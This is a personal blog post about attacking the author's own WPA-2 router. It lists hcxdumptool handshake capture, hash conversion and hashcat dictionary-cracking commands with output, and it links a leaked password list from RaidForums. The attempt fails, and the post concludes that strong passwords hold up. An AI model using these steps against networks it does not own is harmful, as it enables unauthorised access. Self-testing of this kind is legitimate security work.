---
title: "2022 07 12 Wifi Hacking"
date: 2022-07-12T16:30:43+01:00
tags:
    - Hacking
category: 
    - blog
keywords:
    - Hacking
    - Wifi
    - Security
---


## Prelude

Everywhere online, i have heard that wifi was insecure.

Posts talking about WEP and WPA being insecure. WPA-2 being better but still flawed.
I have decided to try and hack my own wifi router to see whether it really is insecure

### Setup

I am using the tp-link archer VR600 v2 as my router with WPA-2 wifi encryption.
I'll be executing my attack from my Arch Linux Laptop

## Hacking my own wifi

After looking around online, I've discovered the hashcat [cracking wpawpa2 wiki article](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
and I'll be following along as a guide.

As I went along, I worked on a script for hacking my wifi to allow for easy re-execution

### Disabling wifi and and enabling the wifi snooper

```bash
#!/usr/bin/env bash

# Disable wifi
sudo systemctl stop wpa_supplicant
# start monitor tool
sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15
# Start wifi
sudo systemctl start wpa_supplicant
```

Enabling wifi and scanning for packets was quite simple.
All you had to do, is install `hcxdumptool` and run the aforementioned commands.
It took roughly 10-15 mins till a `PMKID`or `EAPOL MESSAGE` packet was detected on the network

once the a packet has been found, you can extract the hash of your wpa2 wifi password.

```bash
# Convert traffic
hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
```

The hash is a `WPA-PBKDF2-PMKID+EAPOL` according to the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).

This hash would be vunrable to a veriety of different attack methods:

- Dictionary attack
- Brute-Force attack
- Rule-based attack

I will be attempting a dictionary attack as it would execute in the fastest time

### hashcracking attempt 1

After installing `hashcat` and `opencl` in accordance with [the arch wiki](https://wiki.archlinux.org/title/GPGPU)
I started my first attempt with cracking the hash.

I downloaded a simple [wordlist](https://wpa-sec.stanev.org/dict/cracked.txt.gz) and attempted my first crack
Unfortunatly, I immediately came across an error.

```bash
$ hashcat -m 22000 hash.hc22000 cracked.txt.gz

resulted in this error;
clBuildProgram(): 
    CL_OUT_OF_HOST_MEMORY * Device #1: Kernel /usr/share/hashcat/OpenCL/shared.cl build failed.
```

After an hour of frantic googling online, i finally decided to restart my system and it immediately worked. :grimacing:

```bash
$ hashcat
hashcat (v6.2.5) starting

...

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

...

Dictionary cache built:
* Filename..: ./cracked.txt.gz
* Passwords.: 368163
* Bytes.....: 3992189
* Keyspace..: 368163
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.hc22000
Time.Started.....: Tue Jul 12 18:20:18 2022 (9 secs)
Time.Estimated...: Tue Jul 12 18:20:27 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./cracked.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    42026 H/s (0.48ms) @ Accel:16 Loops:32 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests
Progress.........: 368163/368163 (100.00%)
Rejected.........: 0/368163 (0.00%)
Restore.Point....: 368163/368163 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: kunanesenanuk -> leprechaun6
Hardware.Mon.#1..: N/A

...
```

Sadly this basic dictionary attack failed. This tells me that as long as you have a complicated enough password

### hashcracking attempt 2

After the unsuccessful dictionary attack, i decided to get a bigger and better wordlist.
I went with the [rockyou2021.txt from kys234 on RaidForums](magnet:?xt=urn:btih:JEQMEEFTBXT35RJ3GUTGXU7HP3HBU5P6&dn=rockyou2021.txt%20dictionary%20from%20kys234%20on%20RaidForums&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A6969%2Fannounce).
This is a massive overkill wordlist and after waiting hours for the download+decompressing.

Once finished, the wordlist was around 92GB and roughly 8 billion words long.

Rather than wait for a hashcat to go though the entire wordlist, i grep-ed the wordlist for my wifi password.
After 3 mins, the command resulted in nothing. This seams to show that my wifi password is secure.

## Conclusion

It seams to me that WPA-2 isnt actually as insecure as it would people online would lead you to believe.
As long as you have a secure enough password, it shouldnt be a simple processs hacking into someones WPA-2 wifi network.

Of course, ive only explored one wifi hacking method so far and im aware there are plenty of other methods
